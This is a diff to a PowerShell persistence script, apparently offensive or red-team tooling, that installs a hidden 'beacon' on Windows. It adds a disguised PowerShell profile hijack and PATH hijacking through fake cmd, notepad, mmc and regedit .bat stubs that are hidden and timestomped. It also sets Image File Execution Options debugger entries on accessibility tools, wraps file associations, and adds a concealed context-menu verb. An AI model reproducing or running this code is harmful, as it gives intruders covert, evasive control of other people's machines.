@@ -286,13 +286,23 @@ if (-not $script:PrimarySession) {
 Write-Info "Primary beacon  : $script:PrimaryBeacon"
 Write-Info "Primary session : $script:PrimarySession"
 
+# Build launch command strings that work regardless of beacon file type.
+# cmd.exe cannot ShellExecute a .ps1 directly — it yields "Access is denied."
+if ($BeaconExt -eq ".ps1") {
+    $script:BeaconCmdLaunch = "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:PrimaryBeacon`""
+    $script:BeaconPSLaunch  = "Start-Process powershell.exe -ArgumentList '-NonInteractive','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',`"'$($script:PrimaryBeacon)'`" -ErrorAction SilentlyContinue"
+} else {
+    $script:BeaconCmdLaunch = "`"$script:PrimaryBeacon`""
+    $script:BeaconPSLaunch  = "Start-Process -FilePath '$script:PrimaryBeacon' -WindowStyle Hidden -ErrorAction SilentlyContinue"
+}
+
 # ── 6. Non-interactive persistence ───────────────────────────────────────────────
 if (-not $SkipNonInteractive) {
 
     # ─── B1: PowerShell Profile Hijack (T1546.013) ───────────────────────────────
     Write-Section "B1 — PowerShell Profile Hijack (T1546.013)"
     try {
-        $appendLine = "`n# Windows PowerShell Compatibility Module`nif(Test-Path '$script:PrimaryBeacon' -PathType Leaf){Start-Process -FilePath '$script:PrimaryBeacon' -WindowStyle Hidden -ErrorAction SilentlyContinue}"
+        $appendLine = "`n# Windows PowerShell Compatibility Module`nif(Test-Path '$script:PrimaryBeacon' -PathType Leaf){$script:BeaconPSLaunch}"
 
         $profilePaths = [System.Collections.Generic.List[string]]::new()
         @(
@@ -463,11 +473,32 @@ if (-not $SkipNonInteractive) {
             New-Item -ItemType Directory -Path $hijackDir -Force | Out-Null
         }
 
-        # Drop beacon as common unqualified-executable names defenders call
-        foreach ($fakeName in @("cmd.exe","notepad.exe","mmc.exe","regedit.exe")) {
-            $fakeDest = Join-Path $hijackDir $fakeName
-            $r = Copy-Stealth -Source $BeaconFile -Destination $fakeDest
-            if ($r) { Add-PlantLog -Path $fakeDest -Mechanism "B7:PathHijack" }
+        # Drop interceptors for common unqualified-executable names.
+        # .ps1 beacons cannot be renamed to .exe (not a valid PE → Access is denied);
+        # instead write .bat stubs (PATHEXT searches .BAT before .EXE only when the
+        # hijack dir appears first in PATH, so bare "notepad" resolves to our .bat).
+        $b7Targets = [ordered]@{
+            "cmd"      = "$env:SystemRoot\System32\cmd.exe"
+            "notepad"  = "$env:SystemRoot\System32\notepad.exe"
+            "mmc"      = "$env:SystemRoot\System32\mmc.exe"
+            "regedit"  = "$env:SystemRoot\System32\regedit.exe"
+        }
+        foreach ($baseName in $b7Targets.Keys) {
+            if ($BeaconExt -eq ".ps1") {
+                $fakeDest = Join-Path $hijackDir "$baseName.bat"
+                $realExe  = $b7Targets[$baseName]
+                $batBody  = "@echo off`r`nstart /B powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:PrimaryBeacon`"`r`nstart `"`" `"$realExe`" %*"
+                try {
+                    [System.IO.File]::WriteAllText($fakeDest, $batBody, [System.Text.Encoding]::ASCII)
+                    Set-StealthAttributes -Path $fakeDest
+                    Invoke-Timestomp      -Path $fakeDest
+                    Add-PlantLog -Path $fakeDest -Mechanism "B7:PathHijack"
+                } catch { Write-Warn "  B7 bat [$baseName]: $_" }
+            } else {
+                $fakeDest = Join-Path $hijackDir "$baseName.exe"
+                $r = Copy-Stealth -Source $BeaconFile -Destination $fakeDest
+                if ($r) { Add-PlantLog -Path $fakeDest -Mechanism "B7:PathHijack" }
+            }
         }
 
         $pathKey   = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
@@ -496,7 +527,7 @@ if (-not $SkipInteractive) {
                 $accKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$acc"
                 if (-not (Test-Path $accKey)) { New-Item -Path $accKey -Force | Out-Null }
                 Set-ItemProperty -Path $accKey -Name "Debugger" `
-                    -Value "cmd.exe /c start /B `"$script:PrimaryBeacon`"" -Type String -Force
+                    -Value "cmd.exe /c $script:BeaconCmdLaunch" -Type String -Force
                 Add-PlantLog -Path "$accKey\Debugger" -Mechanism "C1:AccessibilityIFEO:$acc"
                 $c1ok++
             } catch { Write-Warn "  IFEO [$acc]: $_" }
@@ -528,7 +559,7 @@ if (-not $SkipInteractive) {
 
                 # Only wrap once — check if already wrapped
                 if ($existing -notlike "*$script:PrimaryBeacon*") {
-                    $wrapped = "cmd.exe /c start /B `"$script:PrimaryBeacon`" & $existing"
+                    $wrapped = "cmd.exe /c $script:BeaconCmdLaunch & $existing"
                     if (-not (Test-Path $cmdKey)) { New-Item -Path $cmdKey -Force | Out-Null }
                     Set-ItemProperty -Path $cmdKey -Name "(Default)" -Value $wrapped -Force
                     Add-PlantLog -Path $cmdKey -Mechanism "C2:FileAssoc:$progId"
@@ -551,7 +582,7 @@ if (-not $SkipInteractive) {
         # "Extended" means only visible when Shift is held during right-click — reduces visibility
         Set-ItemProperty -Path $verbRoot -Name "Extended"  -Value "" -Force
         Set-ItemProperty -Path $verbCmd  -Name "(Default)" `
-            -Value "cmd.exe /c start /B `"$script:PrimaryBeacon`"" -Force
+            -Value "cmd.exe /c $script:BeaconCmdLaunch" -Force
 
         Add-PlantLog -Path $verbRoot -Mechanism "C3:ContextMenu"
         Write-Success "C3 Context menu: WindowsDiagnosticsExt (Shift+right-click any file → beacon)"
